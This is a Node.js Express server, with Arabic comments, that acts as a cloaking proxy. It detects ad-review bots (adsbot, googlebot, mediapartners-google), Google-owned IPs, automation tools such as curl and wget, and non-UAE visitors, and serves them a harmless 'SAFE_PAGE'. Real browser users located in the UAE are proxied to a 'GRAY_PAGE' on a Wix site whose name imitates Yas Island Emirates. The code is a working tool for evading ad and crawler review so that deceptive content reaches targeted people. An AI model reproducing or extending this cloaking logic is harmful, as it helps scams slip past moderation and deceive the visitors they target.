const express = require("express");
const app = express();
const axios = require("axios");
const dns = require("dns");
const requestIp = require("request-ip");
const ipRangeCheck = require("ip-range-check"); // إذا حبيت توسع مستقبلاً

// --- Configuration ---
const PORT = process.env.PORT || 10000;

const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/seaha";
const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/emaratise";

const UAE_COUNTRY_CODE = "AE";
const GEO_API_URL = "http://ip-api.com/json/";

// --- Trust proxy for correct IP detection ---
app.set("trust proxy", true); // ضروري إذا كنت تستضيف عبر Vercel/Render

// --- Bot Keywords ---
const BOT_KEYWORDS = [
  "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
  "crawler", "spider", "render", "wget", "curl", "python-requests", "node-fetch",
  "monitor", "uptimerobot", "pingdom", "gtmetrix", "lighthouse",
  "facebookexternalhit", "slackbot", "telegrambot", "discordbot", "preview",
  "ahrefsbot", "semrushbot", "mj12bot", "dotbot", "petalbot", "rogerbot", "exabot",
  "sitecheckerbot", "screaming frog", "netcraftsurvey", "prerender", "headlesschrome",
  "bot", "scanner", "analyzer", "validator", "parser", "scraper"
];

// --- Suspicious User-Agents (headless/manual/bots disguised) ---
const SUSPICIOUS_AGENTS = [
  "headlesschrome", "phantomjs", "puppeteer", "axios", "curl", "fetch", "python"
];

// --- Bot Detection Function ---
async function isBot(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ip = req.clientIp || req.ip;

  console.log(`[DEBUG] isBot check: User-Agent = ${ua}`);

  const isUserAgentBot = BOT_KEYWORDS.some(bot => ua.includes(bot));
  if (isUserAgentBot) {
    console.log(`[DEBUG] isBot detected: By User-Agent keyword`);
    return true;
  }

  const commonHeadersPresent = (
    req.headers["accept"] &&
    req.headers["accept-language"] &&
    req.headers["accept-encoding"]
  );
  if (!commonHeadersPresent) {
    console.log(`[DEBUG] isBot detected: Missing headers`);
    return true;
  }

  const isGoogleRelated = await isGoogleRelatedIP(ip);
  if (isGoogleRelated) {
    console.log(`[DEBUG] isBot detected: IP is Google-related (${ip})`);
    return true;
  }

  console.log(`[DEBUG] isBot: No bot detected for IP=${ip}`);
  return false;
}

// --- Check if IP is Google Related ---
async function isGoogleRelatedIP(ip) {
  return new Promise(resolve => {
    if (!ip) return resolve(false);
    dns.reverse(ip, (err, hostnames) => {
      if (err) return resolve(false);
      const isGoogle = hostnames.some(h =>
        h.endsWith(".googlebot.com") ||
        h.endsWith(".google.com") ||
        h.endsWith(".googleusercontent.com")
      );
      resolve(isGoogle);
    });
  });
}

// --- Check for real user (not bot, not automation) ---
function isLikelyRealUser(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const headers = req.headers;

  const basicHeadersPresent = (
    headers["accept"] &&
    headers["accept-language"] &&
    headers["accept-encoding"]
  );

  const isSuspicious = SUSPICIOUS_AGENTS.some(key => ua.includes(key));

  return (
    ua.includes("mozilla") && // browsers like Chrome, Firefox
    basicHeadersPresent &&
    !ua.includes("bot") &&
    !ua.includes("google") &&
    !isSuspicious
  );
}

// --- Proxy Target Page ---
async function proxyContent(targetUrl, req, res) {
  try {
    const headersToForward = {
      "User-Agent": req.headers["user-agent"],
      "Accept": req.headers["accept"],
      "Accept-Encoding": req.headers["accept-encoding"],
      "Accept-Language": req.headers["accept-language"],
    };

    const axiosConfig = {
      method: req.method,
      url: targetUrl + req.url,
      responseType: "stream",
      headers: headersToForward,
      validateStatus: () => true,
    };

    if (["POST", "PUT", "PATCH"].includes(req.method)) {
      axiosConfig.data = req.body;
    }

    const response = await axios(axiosConfig);

    for (const key in response.headers) {
      const value = response.headers[key];
      if (!["connection", "keep-alive", "proxy-authenticate", "proxy-authorization", "te", "trailers", "transfer-encoding", "upgrade", "host"].includes(key.toLowerCase())) {
        res.setHeader(key, value);
      }
    }

    res.status(response.status);
    response.data.pipe(res);
  } catch (error) {
    console.error(`Error proxying to ${targetUrl}:`, error.message);
    if (error.response) {
      res.status(error.response.status).send(`Error loading content from ${targetUrl}`);
    } else {
      res.status(500).send("Internal error");
    }
  }
}

// --- Middleware ---
app.use(requestIp.mw()); // لقراءة IP الزائر الحقيقي
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Universal Route Handler ---
app.all("*", async (req, res) => {
  const ip = req.clientIp || req.ip || "no-ip";
  const ua = req.headers["user-agent"] || "no-agent";
  const path = req.originalUrl;

  console.log(`[${new Date().toISOString()}] Path: ${path} | IP: ${ip} | UA: ${ua}`);

  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));

  let countryCode = null;

  try {
    const geoApiResponse = await axios.get(`${GEO_API_URL}${ip}`);
    console.log(`[DEBUG] GeoIP lookup result:`, geoApiResponse.data);

    if (geoApiResponse.data && geoApiResponse.data.status === "success") {
      countryCode = geoApiResponse.data.countryCode;
    }
  } catch (geoErr) {
    console.error(`[ERROR] GeoIP failed for IP ${ip}:`, geoErr.message);
  }

  const isFromUAE = countryCode === UAE_COUNTRY_CODE;
  const isDetectedBot = await isBot(req);
  const isRealUser = isLikelyRealUser(req);

  if (isFromUAE && !isDetectedBot && isRealUser) {
    console.log("✅ UAE real visitor - redirecting to GRAY_PAGE");
    await proxyContent(GRAY_PAGE, req, res);
  } else {
    console.log("🔒 Bot / Non-UAE / Suspicious visitor - redirecting to SAFE_PAGE");
    await proxyContent(SAFE_PAGE, req, res);
  }
});

// --- Start the Server ---
app.listen(PORT, () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(`GRAY_PAGE (UAE): ${GRAY_PAGE}`);
  console.log(`SAFE_PAGE (bots/others): ${SAFE_PAGE}`);
});
